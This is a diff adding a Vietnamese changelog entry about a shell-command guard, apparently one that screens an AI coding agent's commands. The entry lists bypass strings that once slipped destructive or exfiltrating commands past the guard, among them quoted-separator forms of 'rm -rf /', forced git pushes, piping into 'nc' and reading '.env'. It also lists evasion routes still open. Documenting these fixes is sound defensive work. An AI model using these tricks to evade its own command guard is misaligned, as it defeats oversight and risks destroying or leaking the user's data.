@@ -119,6 +119,27 @@ Bản < 3.20.0: [`CHANGELOG-ARCHIVE.md`](CHANGELOG-ARCHIVE.md) (T-3651; `changel
 
 ### Fixed
 
+- Guard (lý do chạm hàng rào: AUD-SEC-605 🔴, D-414 — lệnh nguy hiểm lọt hẳn): từ chỉ gồm ký tự dấu mà có nháy/thoát
+  (`';'`, `"|"`, `\;`, `$';'`, `'&&'`, `'\n'`) là đối số nguyên văn như bash, không còn bị coi là toán tử — trước đây
+  `tokenize` bỏ nháy rồi mọi bộ tách lệnh cắt ở đó nên phần sau không luật nào xét (`git push origin x ';' --force`,
+  `git commit -m ';' --no-verify`, `rm -rf x '&&' /`, `gh pr close 5 -c ';' -d` từng cho qua). Sửa gốc: `tokenize`
+  trả token đó dạng `LitWord` (không bằng chuỗi toán tử, `_is_punct` sai, `shlex.join` nháy lại nên lệnh lồng
+  `sh -c`/`timeout`/`env`/`find -exec` vẫn thấy chữ; `eval` nối đối số rồi đọc lại như bash); `_dequote` giữ dấu đó cho
+  token còn nháy; find `-exec … \;` so dấu kết bằng chữ; lệnh trong container/`find -exec` ghép lại bằng `_join_tokens`
+  (chuyển hướng trần vẫn là chuyển hướng như trước, chỉ `LitWord` được nháy). Chữ đọc lại quét THÊM bản bỏ chuyển
+  hướng cùng đích (bản có chuyển hướng vẫn quét như trước — `eval nc h 80 < .env`): `eval`/`builtin eval`/`command
+  eval` (`eval git reset > ';' --hard` chạy `git reset --hard`), echo/printf nối ống sang shell (`echo git reset 2> ';'
+  --hard | sh`); printf có `%` quét thêm các đối số nối liền (`printf '%s ' rm -rf / | bash`); `watch` nối đối số rồi
+  `sh -c` nên `';'` là toán tử ở tầng đó. Lệnh có `LitWord` (ở bất kỳ tầng nào) được đọc thêm một lần kiểu cũ — dấu là
+  toán tử — và lấy quyết định chặt hơn (D-415, review #495 lượt 2): cách đọc mới chỉ thêm chặn, không cho qua lệnh
+  nào bản cũ chặn (`eval echo ';' bash <(nc …)`, `git 2> ';' rm -rq docs`, `watch -n 1 gh api -X DELETE … ';'`,
+  `typeset -x ';' HOME=.claude; …` từng lọt vì lỗ guard có từ trước lộ ra khi dấu thôi cắt lệnh); vì thế không chặn
+  oan bớt — `echo ';' git push --force` vẫn bị chặn như trước. **Chưa đóng** (D-415, giữ đúng hành vi cũ): thay tiến
+  trình/thay lệnh GIỮA đối số (`gh pr close 5 <(echo) -d`, `git push origin x < <(echo) --force`, `rm -rf x $(echo) /`,
+  từ dính `$(…)/sub`, `X=<(echo)y`), nháy lồng trong `"$(…)"` (tách thô) và các lỗ có từ trước mà lượt review này lộ ra
+  (dấu tách dính chuyển hướng `ls;>/dev/null rm -rf /`, chuyển hướng giữa `git` và lệnh con, tên thừa của
+  `export`/`typeset`, `cd` thừa đối số dưới dash, toán hạng cố định của `xargs`); bản mở rộng
+  cho lớp thay tiến trình gây hồi quy nên đã gỡ, làm lại riêng. Không đổi ID/mức mục checklist.
 - `release-check` (nợ review #474 AUD-HAR-334): hàng `tree` gọi `git status --porcelain --untracked-files=all
   --ignore-submodules=none` — `status.showUntrackedFiles no` không còn giấu tệp chưa track (vân tay `subject.content`
   gồm tệp đó mà hàng `tree` từng PASS "cây sạch"), `submodule.<tên>.ignore`/`diff.ignoreSubmodules all` không còn giấu
